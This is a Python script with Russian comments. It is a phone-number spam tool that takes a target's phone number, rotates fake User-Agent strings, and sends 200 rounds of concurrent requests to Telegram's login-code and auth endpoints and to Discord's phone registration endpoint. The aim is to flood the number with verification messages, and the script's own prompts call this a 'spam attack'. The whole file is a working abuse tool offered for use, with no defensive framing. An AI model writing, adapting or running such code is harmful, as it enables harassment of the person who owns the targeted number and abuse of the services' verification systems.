import aiohttp
import asyncio
from fake_useragent import UserAgent

# Генерация случайного User-Agent
user = UserAgent().random
headers = {'User-Agent': user}

# Ввод номера телефона
number = input('Введите номер телефона: ')
count = 1
max_rounds = 200  # Количество кругов атак

# URL-адреса для атак
urls = [
    'https://my.telegram.org/auth/send_password',
    'https://telegram.org/support?setln=ru',
    'https://my.telegram.org/auth/',
    'https://discord.com/api/v9/auth/register/phone'
]

# Данные для POST-запросов
data = {'phone': number}

async def send_request(session, url, data=None):
    try:
        if data:
            async with session.post(url, headers=headers, data=data) as response:
                return await response.text()
        else:
            async with session.get(url, headers=headers) as response:
                return await response.text()
    except Exception as e:
        print(f"Ошибка при отправке запроса на {url}: {e}")
        return None

async def attack():
    global count
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            if 'send_password' in url or 'register' in url:
                tasks.append(send_request(session, url, data))
            else:
                tasks.append(send_request(session, url))
        await asyncio.gather(*tasks)
        count += 1
        print(f"Attack Round {count} completed")

async def main():
    input('Нажмите ENTER чтобы начать спам-атаку номером на поддержку TELEGRAM: ')
    for _ in range(max_rounds):
        await attack()
    print("Атака завершена. Все круги выполнены.")

if __name__ == "__main__":
    asyncio.run(main())